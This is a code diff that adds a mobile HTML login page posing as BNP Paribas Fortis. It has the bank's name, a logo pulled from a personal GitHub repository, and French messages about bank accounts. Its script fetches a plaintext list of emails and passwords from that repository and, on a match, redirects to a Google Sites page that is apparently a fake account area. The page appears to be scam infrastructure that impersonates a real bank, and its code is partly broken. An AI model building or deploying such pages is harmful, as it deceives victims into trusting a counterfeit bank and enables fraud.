@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+ 
+ <meta name="viewport" content="width=device-width,height=device-height initial-scale=1">
+  <title></title>
+  <style>
+  @media only screen and (max-width: 360px) {
+    
+  
+    
+    body{
+    position: absolute;
+ 
+    
+   margin :0px;
+   padding: 0px;
+  overflow: hidden;
+      color:white;
+  
+    }
+    .account{
+ padding: 10px 0px;
+    }
+    .account h1{
+     margin: 0px;
+      text-align: center;
+      color: seagreen;
+    }
+    .signup{
+      overflow: hidden;
+    position: relative;
+   display: flex;
+   flex-direction: column;
+   align-items: center;
+   justify-content: center;
+  height:100%;
+    
+ 
+    opacity: 0.9;
+      
+   
+      overflow: hidden;
+    }
+.signup img{
+  
+  height: 100px;
+  width: 360px;
+}
+    input{
+  
+     height:35px;
+      width:300px;
+      margin:20px 10px;
+      display: block;
+     border: 0.5px solid green;
+      border-radius: 4px;
+      font-size: 18px;
+    letter-spacing: 2px;
+      outline: none;
+     
+    }
+    
+  .password ,.email{
+    font-style: bold;
+    text-shadow: 2px 2px 8px lightgreen;
+    font-size: 20px;
+    letter-spacing: 2px;
+    margin: 30px auto;
+    width:100px;
+    color: seagreen;
+  }
+    .btn-sign{
+   display:flex;
+   justify-content: center;
+   font-size: 18px;
+   width:100%;
+    }
+    button{
+      padding:10px 0px;
+     width: 300px;
+        background: white;
+        color:seagreen;
+        border: 0.5px solid darkgreen;
+        border-radius: 8px;
+        font-size: 18px;
+    }
+    button:hover{
+      outline: none;
+      border: none;
+      background: darkgreen;
+      color: whitesmoke;
+    }
+    .info{
+      color: red;
+      text-align: center;
+      font-size:18px;
+      margin: 5px auto;
+    }
+  
+ 
+ #isCompte{
+   display: flex;
+   flex-direction:column;
+justify-content: center;
+   align-items: center;
+   position: absolute;
+   color: black;
+  padding: 20px 10px;
+   letter-spacing: 3px;
+   font-size: 18px;
+   z-index: 200;
+   top:-400px;
+   left: 0px;
+   background: whitesmoke;
+  
+ 
+   transition :top 3s ease;
+ }
+ footer {
+   position:fixed;
+   top: 0px;
+  bottom: 0px;
+  margin: 600px 40px;
+  color:seagreen;
+
+  letter-spacing: 2px;
+  font-size: 20px;
+  text-align: center;
+  
+}
+
+  }
+  </style>
+</head>
+
+
+
+<body>
+  <div id="headears">
+    <header>
+   
+    </header>
+  
+  <div id="isCompte">
+    <div>
+      Vous n'aviez pas de compte chez BNP Paribas Fortis.
+      Veillez vous approchez de l'une de nos agences bancaires près de chez ou contactez par mail nôtre service financier pour en faire la demande de création de votre compte bancaire
+    </div>
+  </div>
+
+ 
+
+
+<div class="signup">
+  <img src="https://raw.githubusercontent.com/lisbonne456/gitau/master/bnp-paribas (1).jpg" alt="">
+  <div class="account">
+ <h1>BNP Paribas Fortis</h1> 
+
+    <div class="email">
+      MailBox@ </div>
+      <div>
+           <input id="mail" type="text"placeholder="r@gmail.com" value="" />
+      </div>
+   
+       <div class="info">
+    
+       </div>
+     <div class="password">
+       Password
+       
+     </div>
+     <div>
+           <input id="passw" type="password" placeholder="secretpassword" value=""/>
+     </div>
+
+   <div class="info">
+     
+   </div>
+ 
+</div>
+ <div class="btn-sign">
+         <button id=" btn"type="button" onclick="add()" >
+         signup
+         </button>
+     </div>
+       
+       </div> 
+      
+      </div>
+     
+     <script type="text/javascript" charset="utf-8">
+   
+     var userConnectMail='',userConnectPassword=""
+     const isCompte=document.getElementById("isCompte")
+     
+     const btn=document.getElementById('btn')
+     const password = document.getElementById('passw')
+     const mail = document.getElementById("mail")
+     const info=document.getElementsByClassName('info')
+     
+     mail.addEventListener("focus",function(){
+       isCompte.style.top='-400px'
+     })
+     password.addEventListener("focus", function() {
+       isCompte.style.top = '-400px'
+     })
+   function add(){
+    
+     if(password.value!=''&& mail.value!=''){
+       userConnectMail=userFindEmail(mail.value,contenu)
+       userConnectPassword=userFindPassword(password.value,contenu)
+       if(password.value.length>=8){
+         
+         info[1].innerHTML=""
+       }
+       else{
+         info[1].innerHTML='password should have lenght 8'
+       }
+     if(mail.value!=''){
+    
+       const index = mail.value.indexOf('@')
+       if (index > -1) {
+         info[0].innerHTML = ''
+       }
+       else {
+         info[0].innerHTML = 'Email should contain @ '
+       }
+     }
+     
+     
+     if(mail.value==userConnectMail.email& password.value==userConnectMail.password){
+   
+     const link=document.getElementById("link")
+       
+ window.location.href='http://sites.google.com/view/bnpparisecuadore/accueil/bnpparisaccount?authuser=0'
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+    
+       
+       
+     }
+     else{
+      
+  isCompte.style.top='0px'
+     }
+     }
+     else{
+       if(mail.value==''){
+     
+         info[0].innerHTML='veillez renseigner le champ Mail'
+       }
+       if(password.value==''){
+       
+         info[1].textContent="veillez renseigner le champ password"
+       }
+       if(mail.value!=''){
+       
+          userConnectMail=userFindEmail(mail.value,contenu)
+         const index=mail.value.indexOf('@')
+         if(index>-1){
+           info[0].innerHTML=''
+         }
+         else{
+           info[0].innerHTML='Email should contain @ '
+         }
+        
+       }
+       if(password.value!=''){
+       userConnectPassword  =userFindPassword(password.value,contenu)
+     
+         info[1].textContent=''
+       
+         
+       }
+     }
+   }
+   
+   
+   function setCookie(name, value, days) {
+     const date = new Date()
+     date.setDate(date.getDate() + days)
+     document.cookie = `${name}=${encodeURIComponent(value)}; expires=${date.toUTCString()}; path="/"`
+   }
+   
+   var contenu=[]
+   
+  
+  function userFetchInfo(user){
+ return user
+  }
+  
+function userFindEmail(mail,content){
+ 
+ 
+ let index=content.findIndex((index)=>index.email==mail )
+ if(index>-1){
+   return content[index]
+   
+ }
+ else{
+   return {email:''
+ }
+  
+ }
+}
+function userFindPassword(password,content){
+  
+  let index= content.findIndex((pass)=>pass.password==password)
+  if(index>-1){
+   return content[index]}
+ else{
+   return {password:''
+ }
+  
+ }
+ 
+}
+
+
+
+
+
+
+
+function loaded(endLoad,text) {
+  let counter=0
+ if(counter===0){
+   
+    let elem=document.getElementsByClassName("progress-done")
+    console.log(elem)
+    var width=10
+    var main=setInterval(frame,100)
+    function frame() {
+     
+      if(width==endLoad){
+        
+ textStatus[0].innerHTML=text
+ 
+ 
+        clearInterval(main)
+      }
+      else{
+        
+        width++
+
+  elem[0].style.width=width+"%"
+         elem[0].innerHTML=width+"%"
+      
+         
+         
+        
+        
+        
+      }
+    }
+  }
+}
+function getCookie(name) {
+  const cookies = document.cookie.split('; ')
+  const value = cookies
+    .find(c => c.startsWith(name + "="))
+    ?.split('=')[1]
+  if (value === undefined) {
+    return null
+  }
+  return decodeURIComponent(value)
+}
+let sessionEmail=""
+let bnpparislisbonne=""
+window.onload=function(){
+  fetch('https://raw.githubusercontent.com/lisbonne456/gitau/master/data.json').then(function(resp) {
+    return resp.json()
+  }).then(function(data) {
+  
+  
+   contenu=(userFetchInfo(data))
+  
+  })
+  
+  if(sessionEmail!=null|| sessionEmail!=undefined && bnpparislisbonne!=null||bnpparislisbonne!=undefined){
+   
+  }
+  
+}
+   console.log(window.innerHeight)
+
+     </script>
+    <footer>
+      All Right Reserved ©2024
+    </footer>
+</body>
+
+</html>
